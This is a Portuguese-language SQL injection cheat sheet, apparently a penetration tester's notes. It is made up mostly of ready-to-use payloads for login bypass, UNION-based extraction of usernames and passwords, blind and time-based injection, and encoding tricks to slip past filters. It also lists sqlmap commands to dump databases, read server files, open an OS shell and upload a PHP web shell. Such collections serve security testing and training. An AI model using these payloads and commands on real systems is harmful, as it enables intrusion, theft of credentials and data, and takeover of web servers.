SQL Injection é quando um atacante manipula consultas de bancos de dados através de um "ponto de entrada" na aplicação.

:fries:Checklist

- Qual é a base de dados usada?
- Identifique "pontos de entrada"
    - Parâmetros na URL
    - Campos de formulário
    - Cabeçalho HTTP (ex.: cookies)
    - Out-of-band (dados retornados de fontes de dados externas)
- Comece testando os códigos mais conhecidos, como por exemplo 'and 1=1-- -
- Observe atentamente mensagens de erro
- Respostas condicionais quando usado "true" or "false"
- Teste se a aplicação é vulnerável a "blind SQLi"
- Respostas com "delay"
- Observe se existem filtros ou bloqueios
    - Use encode
    - Use duplo-encode
    - Use caracteres alternativos
    - Use payloads alternativos
- Teste a injeção usando aspas simples e aspas duplas
- Teste diferentes códigos de comentário para finalizar o payload, como por exemplo -- -
- Teste condições "booleanas" como and 1=1 e and 1=2, observe o tamanho do Content-Length ao fazer essa manipulação
- Teste diferentes códigos para disparar "delay" na resposta
    - MySQL ```sleep(5)```
    - PostgreSQL ```pg_sleep(5)```
    - MS SQL Server ```WAITFOR DELAY '0:0:05'```
    - Oracle ```dbms_pipe.receive_message(('x'),5)```
- Teste códigos com UNION
- Teste o número de colunas usando ```null, ORDER BY 1, ORDER BY 2```
- Teste o tipo de dado ```'a',1```

### SQLMap através de proxy
```
sqlmap -u "[URL]" -p [parametro] --proxy="[URL]:[PORT]" 
```
### SQL Injection User-Agent Payload
```
' UNION SELECT user(); -- -

Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.1) Gecko/2008071222 Firefox/3.0.1' RLIKE (SELECT (CASE WHEN (6091=6091) THEN 0x4d6f7a696c6c612f352e3020285831313b20553b204c696e757820693638363b20706c2d504c3b2072763a312e392e302e3129204765636b6f2f323030383037313232322046697265666f782f332e302e31 ELSE 0x28 END))-- Siej

Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.1) Gecko/2008071222 Firefox/3.0.1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(9324=9324,1))),0x7170626a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- SLLO

Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.1) Gecko/2008071222 Firefox/3.0.1' AND (SELECT 8189 FROM (SELECT(SLEEP(5)))ZmMz)-- nixn

elsagent' RLIKE (SELECT (CASE WHEN (7125=7125) THEN 0x656c736167656e74 ELSE 0x28 END)) AND 'yxqE'='yxqE

elsagent' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6b7871,(SELECT (ELT(3105=3105,1))),0x71786b7071,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'durz'='durz

elsagent' RLIKE (SELECT (CASE WHEN (7125=7125) THEN 0x656c736167656e74 ELSE 0x28 END)) AND 'yxqE'='yxqE

### Identifica as tabelas da base de dados  

'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#

'union SELECT group_concat(table_name) FROM information_schema.schema.tables where table_schema=schema() -- -' 
 
### Identifica as colunas da base de dados

'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='[Nome-Base-de-Dados]'));#
```
### SQLMap comandos 
```
sqlmap -u '[URL]' -p user-agent --random-agent --banner

sqlmap -u [URL]?user=1 -p user

sqlmap -r request -p item  --os-shell  --web-root "/var/www/html/tmp"

## BYPass UNION e payload padrão como 1='1

### Verifica se o paramatro -p é vulnerável, serve para parametros do header HTTP e também da requisição POST 
### Parametro --banner identifica a versão da base de dados 
sqlmap -u 'http://[URL]/' -p user-agent --user-agent=elsagent --banner --level 2 --risk 2

### Identifica as bases de dados da aplicação
sqlmap -u 'http://[URL]/' -p user-agent --dbs --random-agent --level 2 --risk 2 --threads 10

### Identifica as tabelas da base de dados definida no parametro -D 
sqlmap -u 'http://[URL]/' -p user-agent --tables -D [DB-Nome] --random-agent --level 2 --risk 2 --threads 10

### Identifica as colunas da base de dados definida no parametro -D e da tabela definida no parametro -T
sqlmap -u 'http://[URL]/' -p user-agent --columns -D [DB-Nome] -T [Nome-Tabela] --random-agent --level 2 --risk 2 --threads 10  

### Faz o dump das colunas 
sqlmap -u 'http://[URL]/' -p user-agent --columns -D [DB-Nome] -T [Nome-Tabela] --random-agent --level 2 --risk 2 --threads 10 --dump 

### Faz o dump de uma coluna específica
sqlmap -u 'http://[URL]/' -p user-agent --columns -D [DB-Nome] -T [Nome-Tabela] -C [Nome-Coluna] --random-agent --level 2 --risk 2 --threads 10 --dump 

### BYPass filtro de espaço em branco 
sqlmap -u 'http://[URL]/' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' --union-char=els --banner

### Gerar o payload usado pelo SQLMap para descobrir a vulnerabilidade

sqlmap -u 'http://[URL]/' -p user-agent --random-agent --technique=U -v3 --fresh-queries

### Enumerar os usuários 

sqlmap -u 'http://[URL]/' -p user-agent --random-agent --users

### Teste Formulário de Login

sqlmap -u 'http://[URL]/' --data='user=[valor]&password=[valor]' -p user --technique=B --banner

### Teste usando a requisição do Burp

sqlmap -r '[path-to-file-request]' -p user-agent --random-agent --technique=U --banner

### Ver os privilegios
sqlmap -r header-req --current-user --privileges

### Ler arquivo do servidor
Link: https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/

sqlmap -r header-req --file-read=C:\\inetpub\\wwwroot\\database.php
sqlmap -u 192.168.1.124/sqli/Less-1/?id=1 --file-read=/xampp/htdocs/index.php --batch

### Adicionar arquivo no servidor
sqlmap -u 192.168.1.124/sqli/Less-1.?id=1 --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch
```
#### SQL Injection Bypass com scripts 
Use scripts default com a opção Tamper e use scripts customizados como no exemplo [Blind sql](../blind-sql/readme.md)
Tamper Script
```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
#### SQL Injection com encode
```
## Payload
%61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d

## Doble Encode
 %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64

## SQLMap com encode 
sqlmap -u 'http://[URL]/' -p user-agent --tamper=charencode --technique=U --banner


## Doble Encode
sqlmap -u 'http://[URL]/' -p user-agent --tamper=chardoubleencode --dbs --level 2 --risk 2
```

#### SQL Shell
```
sqlmap -u 'http://[URL]/' -p user-agent --sql-shell

## Comandos MySQL

select schema_name from information_schema.schemata;

select table_schema, table_name, column_name from information_schema.tables;

show databases; 
select database();

show schemas;
select schema();

show tables;

## Comandos MSSQL

select name from master..sysdatabases;

select name from sysdatabases;

select name from SYS.databases;

select db_name();
```
#### SQL Injection manual 
```
### Authentication Bypass

username' OR 1=1 -- //

OR = True

### Enumeração SQL Injection

' or 1=1 in (select @@version) -- //

' OR 1=1 in (SELECT * FROM users) -- //

' OR 1=1 in (SELECT * FROM users) --

' or 1=1 in (SELECT password FROM users) -- //

' or 1=1 in (SELECT password FROM users) --

' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

' or 1=1 in (SELECT password FROM users WHERE username = 'admin') --

### UNION SQLi attack conditions 

The injected UNION query has to include the same number of columns as the original query.<p>
The data types need to be compatible between each column.

' ORDER BY 1,1,1,1,1,1 -- //

' ORDER BY 1,1,1,1,1,1 --

%' UNION SELECT database(), user(), @@version, null, null --

' UNION SELECT null, null, database(), user(), @@version  -- //

' UNION SELECT null, null, database(), user(), @@version  --

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() --

' UNION SELECT null, username, password, description, null FROM users -- //

' UNION SELECT null, username, password, description, null FROM users --

### Blind SQLi

AND 1=1 -- //

AND 1=1 --

AND IF (1=1, sleep(3),'false') -- //

AND IF (1=1, sleep(3),'false') --
```
#### Payload Geral
```
{payload}--
{payload};--
{payload}#
'||{payload}--
'||{payload}#
"{payload}--
"{payload}#
' AND {payload}--
' OR {payload}--
' AND EXISTS({payload})--
' OR EXISTS({payload})--
```
#### MYSql 
```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'||{payload}--
"||{payload}--
'||(SELECT {payload})--
"||(SELECT {payload})--
```
#### PostgreSQL
```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
```
#### Oracle
```
' UNION ALL SELECT {payload} FROM dual--
' UNION SELECT {payload} FROM dual--
' OR (SELECT {payload} FROM dual) IS NOT NULL--
' OR (SELECT {payload} FROM dual) IS NULL--
'||({payload})--
'||{payload}||'--
"||{payload}||"--
'||(SELECT {payload} FROM dual)--
```
#### MSSql 
```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'+{payload}+
"+{payload}+
'+'+(SELECT {payload})+
"+"+(SELECT {payload})+
```
#### Outros payloads
```
OR {payload}=1
AND {payload}=1
AND IF({payload}, SLEEP(5), 1)
AND CASE WHEN {payload} THEN sleep(5) ELSE NULL END
AND {payload}
AND NOT {payload}
AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT('Error:',{payload},0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

#### :orange_book: Site para testar códigos SQL: https://www.db-fiddle.com/
#### :orange_book: Portswigger Cheatsheet para SQL Injection: https://portswigger.net/web-security/sql-injection/cheat-sheet


